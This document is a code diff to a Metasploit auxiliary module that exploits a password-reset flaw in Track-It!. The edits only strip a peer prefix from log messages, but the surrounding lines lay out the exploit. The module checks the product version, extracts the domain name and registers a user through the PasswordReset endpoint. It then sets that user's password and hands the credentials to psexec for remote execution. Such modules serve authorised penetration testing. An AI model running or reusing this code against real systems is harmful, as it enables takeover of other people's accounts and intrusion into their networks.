@@ -56,13 +56,13 @@ class MetasploitModule < Msf::Auxiliary
       uri = normalize_uri(target_uri.path, 'PasswordReset')
       send_request_cgi('uri' => uri)
     rescue => e
-      vprint_error("#{peer}: unable to request #{uri}: #{e}")
+      vprint_error("unable to request #{uri}: #{e}")
       nil
     end
   end
 
   def check_host(ip)
-    vprint_status("#{peer}: retrieving PasswordReset page to extract Track-It! version")
+    vprint_status("retrieving PasswordReset page to extract Track-It! version")
 
     unless (res = password_reset)
       return
@@ -80,18 +80,18 @@ class MetasploitModule < Msf::Auxiliary
             info: "Module #{fullname} detected Track-It! version #{version}",
             refs: references
           )
-          vprint_status("#{peer}: Track-It! version #{version} is less than #{fix_version}")
+          vprint_status("Track-It! version #{version} is less than #{fix_version}")
           return Exploit::CheckCode::Vulnerable("Track-It! version #{version} is vulnerable to password reset")
         else
-          vprint_status("#{peer}: Track-It! version #{version} is not less than #{fix_version}")
+          vprint_status("Track-It! version #{version} is not less than #{fix_version}")
           return Exploit::CheckCode::Safe("Track-It! version #{version} is not vulnerable")
         end
       else
-        vprint_error("#{peer}: unable to get Track-It! version")
+        vprint_error("unable to get Track-It! version")
         return Exploit::CheckCode::Unknown('Unable to determine Track-It! version')
       end
     else
-      vprint_status("#{peer}: does not appear to be running Track-It!")
+      vprint_status("does not appear to be running Track-It!")
       return Exploit::CheckCode::Safe('Target does not appear to be running Track-It!')
     end
   end
@@ -100,9 +100,9 @@ class MetasploitModule < Msf::Auxiliary
     return unless check_host(ip) == Exploit::CheckCode::Vulnerable
 
     if datastore['DOMAIN'].blank?
-      vprint_status("#{peer}: retrieving session cookie and domain name")
+      vprint_status("retrieving session cookie and domain name")
     else
-      vprint_status("#{peer}: retrieving domain name")
+      vprint_status("retrieving domain name")
     end
 
     unless (res = password_reset)
@@ -113,9 +113,9 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['DOMAIN'].blank?
       if res.body =~ /"domainName":"([^"]*)"/
         domain = Regexp.last_match(1)
-        vprint_status("#{peer}: found domain name: #{domain}")
+        vprint_status("found domain name: #{domain}")
       else
-        print_error("#{peer}: unable to obtain domain name.  Try specifying DOMAIN")
+        print_error("unable to obtain domain name.  Try specifying DOMAIN")
         return
       end
     else
@@ -123,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     full_user = "#{domain}\\#{localuser}"
-    vprint_status("#{peer}: registering #{full_user}")
+    vprint_status("registering #{full_user}")
     answers = [ Rex::Text.rand_text_alpha(8), Rex::Text.rand_text_alpha(8) ]
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
@@ -142,11 +142,11 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if !res || res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
-      print_error("#{peer}: Could not register #{full_user}")
+      print_error("Could not register #{full_user}")
       return
     end
 
-    vprint_status("#{peer}: changing password for #{full_user}")
+    vprint_status("changing password for #{full_user}")
 
     if datastore['LOCALPASS'].blank?
       password = Rex::Text.rand_text_alpha(10) + "!1"
@@ -167,7 +167,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if !res || res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
-      print_error("#{peer}: Could not change #{full_user}'s password -- is it a domain or local user?")
+      print_error("Could not change #{full_user}'s password -- is it a domain or local user?")
       return
     end
 
@@ -178,6 +178,6 @@ class MetasploitModule < Msf::Auxiliary
       info: "Module #{fullname} changed #{full_user}'s password to #{password}",
       refs: references
     )
-    print_good("#{peer}: Please run the psexec module using #{full_user}:#{password}")
+    print_good("Please run the psexec module using #{full_user}:#{password}")
   end
 end
